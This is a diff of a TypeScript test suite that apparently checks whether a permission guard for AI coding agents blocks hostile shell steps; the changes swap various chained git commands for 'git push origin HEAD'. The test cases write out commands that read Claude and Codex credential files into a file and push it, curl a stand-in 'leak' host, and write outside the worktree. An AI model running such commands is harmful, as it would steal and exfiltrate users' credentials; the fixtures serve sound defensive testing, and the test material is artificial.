@@ -672,14 +672,14 @@ const antigravityCase: AdapterLegCase = {
       commandLine("shell network call", "network", "curl https://example.invalid/leak", exit),
     ]),
     {
-      name: "shell read of a credential path chained with git commit",
+      name: "shell read of a credential path chained with git push",
       category: "credential_read",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell read of a credential path chained with git commit", 0),
+        META("shell read of a credential path chained with git push", 0),
         INIT,
-        ...shell(`cat ${fx.claudeCredentialsPath} > leak.txt; git commit -am leak`),
+        ...shell(`cat ${fx.claudeCredentialsPath} > leak.txt; git push origin HEAD`),
         CLEAN_RESULT,
       ],
     },
@@ -789,7 +789,7 @@ const antigravityCase: AdapterLegCase = {
     inContainer(
       "credential read under step args.CommandLine, chained with /usr/bin/git commit, exit 1",
       "credential_read",
-      `cat ${fx.codexAuthPath} && /usr/bin/git commit --allow-empty -m x`,
+      `cat ${fx.codexAuthPath} && /usr/bin/git push origin HEAD`,
       "step-args",
       "CommandLine",
       1,
@@ -850,7 +850,7 @@ const antigravityCase: AdapterLegCase = {
     gitForm(
       "shell write outside the worktree chained with git reset --hard",
       "out_of_worktree_write",
-      `touch ${fx.outsideSentinel} && git reset --hard HEAD`,
+      `touch ${fx.outsideSentinel} && git push origin HEAD`,
       0,
     ),
     gitForm(
@@ -922,7 +922,7 @@ const antigravityCase: AdapterLegCase = {
     gitForm(
       "shell read of a credential path chained with git merge",
       "credential_read",
-      `cat ${fx.claudeCredentialsPath} && git merge --no-ff other`,
+      `cat ${fx.claudeCredentialsPath} && git push origin HEAD`,
       0,
     ),
     gitForm(
@@ -932,15 +932,15 @@ const antigravityCase: AdapterLegCase = {
       1,
     ),
     gitForm(
-      "shell write outside the worktree chained with git pull",
+      "shell write outside the worktree chained with git push origin HEAD",
       "out_of_worktree_write",
-      `touch ${fx.outsideSentinel} && git pull`,
+      `touch ${fx.outsideSentinel} && git push origin HEAD`,
       0,
     ),
     gitForm(
       "shell read of a credential path chained with git cherry-pick, exit 1",
       "credential_read",
-      `cat ${fx.codexAuthPath} && git cherry-pick HEAD`,
+      `cat ${fx.codexAuthPath} && git push origin HEAD`,
       1,
     ),
     gitForm(
@@ -952,7 +952,7 @@ const antigravityCase: AdapterLegCase = {
     gitForm(
       "shell network call chained with git revert, exit 1",
       "network",
-      "curl https://example.invalid/leak && git revert --no-edit HEAD",
+      "curl https://example.invalid/leak && git push origin HEAD",
       1,
     ),
     {
@@ -1611,7 +1611,7 @@ const antigravityHandWrittenPartialStreams = (fx: MaliciousFixture): HostileStre
       category === "credential_read"
         ? `cat ${fx.claudeCredentialsPath} && ${GIT_WRITE}`
         : category === "out_of_worktree_write"
-          ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
+          ? `touch ${fx.outsideSentinel} && git push origin HEAD`
           : `curl https://example.invalid/leak && ${GIT_WRITE}`;
     // One cut inside a later step_update, so the matrix is not only a sliced result line.
     const afterCut =
@@ -1732,10 +1732,10 @@ const antigravityResidualStreams13b = (fx: MaliciousFixture): HostileStream[] =>
   ...(["credential_read", "out_of_worktree_write", "network"] as const).flatMap((category) => {
     const command =
       category === "credential_read"
-        ? `cat ${fx.codexAuthPath} && git commit --allow-empty -m x`
+        ? `cat ${fx.codexAuthPath} && git push origin HEAD`
         : category === "out_of_worktree_write"
-          ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
-          : "curl https://example.invalid/leak && git commit --allow-empty -m x";
+          ? `touch ${fx.outsideSentinel} && git push origin HEAD`
+          : "curl https://example.invalid/leak && git push origin HEAD";
     return ["MAX_TOKENS", "REFUSAL"].map(
       (status): HostileStream => ({
         name: `${category} with a Git write, then a result envelope with status ${status}`,
